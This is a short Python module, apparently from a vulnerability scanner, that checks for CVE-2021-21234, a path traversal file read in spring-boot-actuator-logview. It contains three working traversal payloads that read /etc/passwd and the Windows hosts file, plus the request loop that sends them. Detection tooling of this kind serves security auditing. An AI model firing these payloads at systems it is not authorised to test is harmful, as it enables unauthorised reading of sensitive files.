#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2021_21234_payloads = [
    {'path': 'manage/log/view?filename=/etc/passwd&base=../../../../../../../'},
    {'path': 'manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../'},
    {'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../'}
]

def cve_2021_21234_scan(clients):
    ''' spring-boot-actuator-logview文件包含漏洞
            <= 0.2.13
            虽然检查了文件名参数以防止目录遍历攻击(filename=../somefile 防御了攻击)
            但没有充分检查基本文件夹参数, 因此filename=somefile&base=../ 可以访问日志记录基目录之外的文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Spring',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2021-21234',
    }

    for payload in cve_2021_21234_payloads: # * Payload
        path = payload['path']              # * Path

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
